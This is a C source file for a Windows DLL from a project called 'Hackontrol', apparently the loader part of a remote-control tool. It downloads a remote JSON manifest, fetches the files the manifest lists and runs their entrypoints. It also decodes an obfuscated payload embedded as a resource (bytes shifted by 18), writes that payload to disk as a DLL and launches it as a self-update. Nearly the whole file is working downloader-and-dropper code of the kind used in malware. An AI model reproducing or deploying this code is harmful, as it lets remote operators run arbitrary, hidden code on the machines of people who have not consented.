#include <khopanstring.h>
#include <khopanjson.h>
#include <hackontrolcurl.h>
#include "execute.h"
#include "resource.h"

#ifdef _DEBUG
#define HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
#define HACKONTROL_NO_SELF_UPDATE
//#define HACKONTROL_NO_DOWNLOAD_FILE
//#define HACKONTROL_NO_EXECUTE_FILE
#endif

#define MESSAGE_BOX(x) MessageBoxW(NULL, x, L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL)

static HINSTANCE globalInstance;

static BOOL selfUpdate(cJSON* root);

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	CURLcode code = curl_global_init(CURL_GLOBAL_ALL);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_global_init");
		return;
	}

#ifdef HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
	HANDLE file = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(!file) {
		KHWin32DialogErrorW(GetLastError(), L"CreateFileW");
		return;
	}

	LARGE_INTEGER integer;

	if(!GetFileSizeEx(file, &integer)) {
		KHWin32DialogErrorW(GetLastError(), L"GetFileSizeEx");
		return;
	}

	LPSTR buffer = LocalAlloc(LMEM_FIXED, integer.LowPart);

	if(!buffer) {
		KHWin32DialogErrorW(GetLastError(), L"LocalAlloc");
		return;
	}

	DWORD bytesRead;

	if(!ReadFile(file, buffer, integer.LowPart, &bytesRead, NULL)) {
		KHWin32DialogErrorW(GetLastError(), L"ReadFile");
		LocalFree(buffer);
		return;
	}

	cJSON* rootObject = cJSON_Parse(buffer);
	LocalFree(buffer);
#else
	DataStream stream = {0};

	if(!HackontrolDownloadData(&stream, URL_LATEST_FILE, TRUE, &code)) {
		KHCURLDialogErrorW(code, L"HackontrolDownloadData");
		goto globalCleanup;
	}

	KHDataStreamAdd(&stream, "", sizeof(CHAR));
	cJSON* rootObject = cJSON_Parse(stream.data);
	KHDataStreamFree(&stream);
#endif
	if(!rootObject) {
		MESSAGE_BOX(L"Error while parsing JSON document");
		goto globalCleanup;
	}
#ifndef HACKONTROL_NO_SELF_UPDATE
	if(!selfUpdate(rootObject)) {
		goto deleteJson;
	}
#endif
#ifndef HACKONTROL_NO_DOWNLOAD_FILE
	ProcessFilesArray(rootObject);
#endif
#ifndef HACKONTROL_NO_EXECUTE_FILE
	ProcessEntrypointsArray(rootObject);
#endif
#ifndef HACKONTROL_NO_SELF_UPDATE
	deleteJson:
#endif
	cJSON_Delete(rootObject);
globalCleanup:
	curl_global_cleanup();
}

static BOOL selfUpdate(cJSON* root) {
	cJSON* selfObject = KHJSONGetObject(root, "self", NULL);

	if(!selfObject) {
		return TRUE;
	}

	char* url = KHJSONGetString(selfObject, "url", NULL);

	if(!url) {
		return TRUE;
	}

	LPWSTR pathFolderHackontrol = HackontrolGetDirectory(TRUE);

	if(!pathFolderHackontrol) {
		return TRUE;
	}

	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderHackontrol);

	if(!pathFileLibdll32) {
		LocalFree(pathFolderHackontrol);
		return TRUE;
	}

	BOOL result = CheckFileHash(selfObject, pathFileLibdll32);
	LocalFree(pathFileLibdll32);

	if(result) {
		LocalFree(pathFolderHackontrol);
		return TRUE;
	}

	HRSRC resourceHandle = FindResourceW(globalInstance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!resourceHandle) {
		LocalFree(pathFolderHackontrol);
		return TRUE;
	}

	DWORD resourceSize = SizeofResource(globalInstance, resourceHandle);

	if(!resourceSize) {
		LocalFree(pathFolderHackontrol);
		return TRUE;
	}

	HGLOBAL resource = LoadResource(globalInstance, resourceHandle);

	if(!resource) {
		LocalFree(pathFolderHackontrol);
		return TRUE;
	}

	BYTE* data = LockResource(resource);

	if(!data) {
		LocalFree(pathFolderHackontrol);
		return TRUE;
	}

	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);

	if(!buffer) {
		LocalFree(pathFolderHackontrol);
		return TRUE;
	}

	for(DWORD i = 0; i < resourceSize; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR pathFileLibupdate32 = KHFormatMessageW(L"%ws\\" FILE_LIBUPDATE32, pathFolderHackontrol);
	LocalFree(pathFolderHackontrol);

	if(!pathFileLibupdate32) {
		LocalFree(buffer);
		return TRUE;
	}

	DataStream stream = {0};
	stream.data = buffer;
	stream.size = resourceSize;
	result = HackontrolWriteFile(pathFileLibupdate32, &stream);
	KHDataStreamFree(&stream);

	if(!result) {
		LocalFree(pathFileLibupdate32);
		return TRUE;
	}

	LPWSTR argumentFileLibupdate32 = KHFormatMessageW(L"%lu %S", GetCurrentProcessId(), url);

	if(!argumentFileLibupdate32) {
		LocalFree(pathFileLibupdate32);
		return TRUE;
	}

	KHWin32StartDynamicLibraryW(pathFileLibupdate32, FUNCTION_LIBUPDATE32, argumentFileLibupdate32);
	LocalFree(argumentFileLibupdate32);
	LocalFree(pathFileLibupdate32);
	return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
	globalInstance = instance;
	return TRUE;
}
